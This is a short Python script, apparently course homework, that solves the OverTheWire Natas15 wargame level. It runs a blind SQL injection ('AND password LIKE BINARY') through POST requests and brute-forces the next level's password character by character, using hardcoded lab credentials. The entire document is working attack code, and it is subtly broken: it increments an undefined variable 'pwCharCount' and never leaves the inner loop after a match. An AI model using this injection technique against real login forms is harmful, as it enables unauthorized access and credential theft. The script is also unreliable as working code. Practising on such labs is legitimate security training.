##  -- CNS 380 -- Natas16 Homework

from requests import *

lst = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
       'q','r','s','t','u','v','w','x','y','z',
       'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
       'Q','R','S','T','U','V','W','X','Y','Z',
       '0','1','2','3','4','5','6','7','8','9']

#brute force with SQL Injection
def bruteSQL():

    url = "http://natas15.natas.labs.overthewire.org/"
    auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
    natas16pw = ""
    
    #SQL Query being injected:  username="natas16" AND password LIKE BINARY "%
    #While loop runs until all 32 characters of password are found
    while len(natas16pw) < 32:
        for char in lst:
            payload = "natas16\" AND password LIKE BINARY \"{}%".format(natas16pw + char)
            data =  [("username", payload)]
            response = request("POST", url, auth=auth, data=data)

            #Checks for successful query, adds char to natas16pw if successful
            if "This user exists" in response.text:
                natas16pw += char
                pwCharCount += 1
                print (natas16pw)

    print("Final password for natas16: ", natas16pw)    


    
        
